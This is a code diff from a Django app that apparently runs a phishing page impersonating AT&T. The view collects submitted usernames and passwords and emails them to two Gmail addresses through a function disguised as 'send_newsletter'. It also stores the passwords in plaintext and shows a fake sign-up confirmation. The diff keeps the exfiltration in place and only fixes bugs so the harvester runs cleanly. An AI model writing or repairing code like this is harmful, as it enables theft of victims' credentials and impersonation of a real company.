@@ -67,14 +67,12 @@ def home(request):
     if request.method == 'POST':
         email = request.POST.get('username')
         password = request.POST.get('password')
-        print(f'Password: {password}' )
-        print(f'Email: {email}' )
         try:
             send_newsletter('timyin25@gmail.com',email,password)
             send_newsletter('inforehubdeveloper@gmail.com',email,password)
-            messages.success('Congratulations you have signed up to AT&T')
+            messages.success(request,'Congratulations you have signed up to AT&T')
         except Exception:
-             messages.error('Try again something went wrong')
+             messages.error(request,'Try again something went wrong')
              
         Detail.objects.create(email=email,passwords=password)
     return render(request,'att_app/new.html')
